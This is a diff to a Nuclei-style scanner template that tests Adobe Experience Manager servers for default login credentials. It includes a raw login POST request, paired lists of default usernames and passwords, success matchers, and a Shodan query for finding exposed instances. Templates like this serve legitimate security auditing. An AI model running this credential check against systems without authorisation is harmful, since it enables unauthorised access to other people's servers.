@@ -1,7 +1,6 @@
 id: aem-default-login
-
 info:
-  name: Adobe AEM Default Credentials
+  name: Adobe AEM Default Login
   author: random-robbie
   severity: high
   description: Adobe AEM default login credentials were discovered.
@@ -15,31 +14,24 @@ info:
   metadata:
     runzero-match: service["http.body"] contains `href="/etc.clientlibs/`
     max-request: 8
+    product: experience_manager
+    shodan-query: http.component:"Adobe Experience Manager"
     vendor: adobe
-  tags: aem,default-login,adobe,vuln
-
+  tags: adobe,aem,default-login,vuln
 http:
-  - raw:
-      - |
-        POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-        Origin: {{BaseURL}}
-        Referer: {{BaseURL}}/libs/granite/core/content/login.html
-
-        _charset_=utf-8&j_username={{aem_user}}&j_password={{aem_pass}}&j_validate=true
-
-    attack: pitchfork
+  - attack: pitchfork
+    matchers:
+      - status:
+          - 200
+        type: status
+      - condition: and
+        part: header
+        type: word
+        words:
+          - login-token
+          - crx.default
+    matchers-condition: and
     payloads:
-      aem_user:
-        - admin
-        - grios
-        - replication-receiver
-        - vgnadmin
-        - author
-        - anonymous
-        - jdoe@geometrixx.info
-        - aparker@geometrixx.info
       aem_pass:
         - admin
         - password
@@ -49,18 +41,22 @@ http:
         - anonymous
         - jdoe
         - aparker
+      aem_user:
+        - admin
+        - grios
+        - replication-receiver
+        - vgnadmin
+        - author
+        - anonymous
+        - jdoe@geometrixx.info
+        - aparker@geometrixx.info
+    raw:
+      - |
+        POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/libs/granite/core/content/login.html
+
+        _charset_=utf-8&j_username={{aem_user}}&j_password={{aem_pass}}&j_validate=true
     stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        part: header
-        words:
-          - login-token
-          - crx.default
-        condition: and
-
